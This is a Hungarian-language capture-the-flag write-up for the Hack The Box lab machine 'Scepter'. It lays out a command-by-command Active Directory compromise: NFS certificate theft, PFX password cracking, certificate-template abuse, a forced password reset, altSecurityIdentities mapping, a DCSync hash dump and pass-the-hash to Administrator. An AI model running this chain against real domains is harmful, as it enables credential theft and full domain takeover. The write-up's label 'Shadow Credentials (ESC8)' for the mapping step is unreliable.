
# HTB Scepter - Writeup (Magyar)

**Platform:** Windows  
**IP:** 10.10.11.65  
**Difficulty:** Hard  
**Author:** No4Sec

---

## Recon / Felderítés

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
111/tcp  open  rpcbind       2-4 (RPC #100000)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb)
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scepter.htb)
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb)
3269/tcp open  ssl/ldap
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0
```
Service Info: Host: DC01; OS: Windows

---

## Előkészítés

- **Host fájl szerkesztése**
    ```bash
    sudo nano /etc/hosts
    ```
    ```
    10.10.11.65     dc01.scepter.htb scepter.htb
    ```

- **Clock skew (időszinkron)**
    ```bash
    sudo rdate -n scepter.htb
    ```

---

## NFS Share & Tanúsítványok

**NFS elérhető, mountoljuk:**

```bash
showmount -e 10.10.11.65
mkdir /tmp/helpdesk
sudo mount -t nfs 10.10.11.65:/helpdesk /tmp/helpdesk
ls -l /tmp/helpdesk
```
**Talált fájlok:**
- baker.crt
- baker.key
- clark.pfx
- lewis.pfx
- scott.pfx

**Jelszó feltörése PFX-hez:**
```bash
pfx2john clark.pfx > clark.hash
john --wordlist=/usr/share/wordlists/rockyou.txt clark.hash
```
Jelszó: `ne*********`

**baker.key feloldása**
```bash
openssl rsa -in baker.key -out baker.plain.key
```

**baker.key + baker.crt → pfx:**
```bash
sudo openssl pkcs12 -export -out baker.pfx -inkey baker.plain.key -in baker.crt
```

---

## Certipy authentication baker.pfx-el

```bash
certipy auth -pfx baker.pfx -username d.baker -dc-ip 10.10.11.65
```
TGT szerzés, hash dump, `.ccache` export:
```bash
export KRB5CCNAME=d.baker.ccache
```

---

## Certipy find & új cert szerezése

```bash
certipy find -k -no-pass -dc-ip 10.10.11.65 -target dc01.scepter.htb
certipy req -u 'd.baker@scepter.htb' -dc-ip 10.10.11.65 -dc-host dc01.scepter.htb -target dc01.scepter.htb -ca 'scepter-DC01-CA' -template 'User' -k -no-pass
```

---

## Bloodhound & Privilege Escalation Chain

**Bloodhound futtatása:**
```bash
sudo bloodhound-python    -u 'd.baker'    -d scepter.htb    -k -no-pass    -dc dc01.scepter.htb    -ns 10.10.11.65    --dns-tcp    --disable-autogc    -c all --zip
```
**Találat:**  
- d.baker user tud **force change password-ot** végrehajtani a.carter-en.

---

## Force Change Password - a.carter user

```bash
pth-rpcclient -U 'SCEPTER\d.baker%aad3b4...:18b5fb...' 10.10.11.65 -c "setuserinfo2 a.carter 23 'NoSecHere!'"
```

---

## GenericAll StaffAccessCertificate OU felett

```bash
bloodyAD -d scepter.htb -u a.carter -p 'NoSecHere!' --host dc01.scepter.htb --dc-ip 10.10.11.65 add genericAll "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" a.carter
```

---

## Permission teszt: mail attribútum írás

```bash
bloodyAD -d scepter.htb -u a.carter -p 'NoSecHere!' --host dc01.scepter.htb set object d.baker mail -v h.brown@scepter.htb
```
Ha sikeres: jog rendben.

---

## StaffAccessCertificate template abuse

```bash
certipy req -username "d.baker@scepter.htb" -hashes :18b5fb... -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate'
```

---

## NT hash szerzése h.brown userhez

```bash
certipy auth -pfx d.baker.pfx -domain scepter.htb -dc-ip 10.10.11.65 -username h.brown
```
Hash: `aad3b4...:4ecf52...`

---

## krb5.conf szerkesztés

```ini
[libdefaults]
    default_realm = SCEPTER.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    SCEPTER.HTB = {
        kdc = dc01.scepter.htb
        admin_server = dc01.scepter.htb
    }

[domain_realm]
    .scepter.htb = SCEPTER.HTB
    scepter.htb = SCEPTER.HTB
```

---

## evil-winrm h.brown userrel

```bash
export KRB5CCNAME=h.brown.ccache
evil-winrm -i dc01.scepter.htb -u h.brown
```

**User flag pipa!**

---

## Privilege escalation – új gépfiók létrehozás, Shadow Credentials

```bash
bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 'NoSecHere!' --dc-ip 10.10.11.65 add computer nosecpc 'Password123'
```

**Certipy find + req → géptanúsítvány beszerzés**

**openssl x509 -in nosecpc.crt -noout -serial -issuer**

---

## X509 string generálás (Python)

```python
import argparse

def convert(serial, issuer):
    serial = serial.replace(':', '').lower()
    serial_bytes = bytearray.fromhex(serial)
    serial_bytes.reverse()
    serial_hex = ''.join(['%02x' % b for b in serial_bytes])
    issuer_parts = issuer.split(',')
    issuer_parts = [p.strip() for p in issuer_parts]
    issuer_parts.reverse()
    issuer_str = ','.join(issuer_parts)
    print(f"X509:<I>{issuer_str}<SR>{serial_hex}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-serial', required=True, help='Certificate serial (colon separated)')
    parser.add_argument('-issuer', required=True, help='Certificate issuer')
    args = parser.parse_args()
    convert(args.serial, args.issuer)
```
**Futtatás:**
```bash
python3 conv.py -serial 62:00:00:00:09:92:96:68:CF:F0:98:1A:D8:00:00:00:00:00:09 -issuer "DC=htb, DC=scepter, CN=scepter-DC01-CA"
```
Kimenet pl.:
```
X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>090000000000d81a98f0cf6896920900000062
```

---

## PowerShell: altSecurityIdentities beállítása

```powershell
$map = 'X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>090000000000d81a98f0cf6896920900000062'
Set-ADUser p.adams -Replace @{altSecurityIdentities=$map}
```

---

## Certipy auth p.adams-ként

```bash
certipy auth -pfx meow.pfx -dc-ip 10.10.11.65 -username p.adams
```
Hash: `aad3b4...:1b925c...`

---

## DCSync (ADDC hash dump)

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc -hashes aad3b4...:1b925c... scepter.htb/p.adams@10.10.11.65
```

---

## Pass-the-Hash Admin shell

```bash
evil-winrm -i 10.10.11.65 -u Administrator -H a291ea...
```

Root flag pipa!

---

---

## Jegyzetek & Magyarázat

### Mit tanultam ebből a gépből?

- **ADCS/PKI attack chain**: Lépésről-lépésre végigmentem az NFS share → tanúsítvány visszafejtés → user és gép cert → shadow credentials → DCSync → Pass-the-Hash láncon.
- **Bloodhound használat**: Szinte minden privilege escalation lehetőség itt derült ki, onnantól végig Bloodhound alapú volt a lánc.
- **Tanúsítvány abuse**: Különösen érdekes volt látni, hogy *genericall* jog mennyire gyorsan vezethet teljes kompromittációhoz.
- **AD privilege modellezés**: Minden delegáció, OU, attribútumjog szépen kihasználható volt, a teszt mail-írás is hasznos visszajelzés.
- **Shadow Credentials (ESC8)**: Modern, valós támadási technika, éles AD környezetben is abszolút releváns.
- **Scriptelés (conv.py)**: Egy egyszerű python script rengeteg manuális szívástól kímél meg az ADCS-es X509 stringek átalakításánál.

---

### Hibák, csapdák, tanácsok

- **Időszinkron kötelező!**  
  Ha nem stimmel a rendszeróra, minden Kerberos/PKINIT lépés hibát dob.
- **A certipy és bloodyAD verzió számít**  
  Néhány parancs eltérhet régi/új certipy között, mindig frissítsünk vagy forrásból telepítsünk.
- **Sose bízzunk a default permission-ökben**  
  Egy rosszul konfigurált *GenericAll* vagy *Write* jog az egész domaint kompromittálhatja.
- **Mindig teszteljük az írási jogokat, mielőtt fontos attribútumokat írunk**  
  (pl. mail írás teszt – ha megy, a shadow creds is fog menni).

---

### Összegzés

A **Scepter** egy kiváló példája, hogyan lehet egy “sima” NFS megosztásból és pár ADCS hibából  
**teljes Active Directory kompromittálást csinálni modern eszközökkel**.

A gép végigvezet a klasszikus és modern privilege escalation technikákon,  
miközben minden egyes láncszemnél tanulhatsz az ADCS, LDAP, privilege management,  
és Bloodhound világából.

- **User flag:** ADCS abuse, reset, privilege escalation
- **Root flag:** Shadow credentials, DCSync hash dump, PTH admin shell

**Nagyon ajánlom mindenkinek, aki az AD-s privilege escalation, tanúsítvány abuse,  
vagy Red Teaming iránt érdeklődik!**

---

*By [NoSec](https://github.com/No4Sec/)* 
*Ha kérdésed van, vagy további magyarázat kell, írj nyugodtan!*
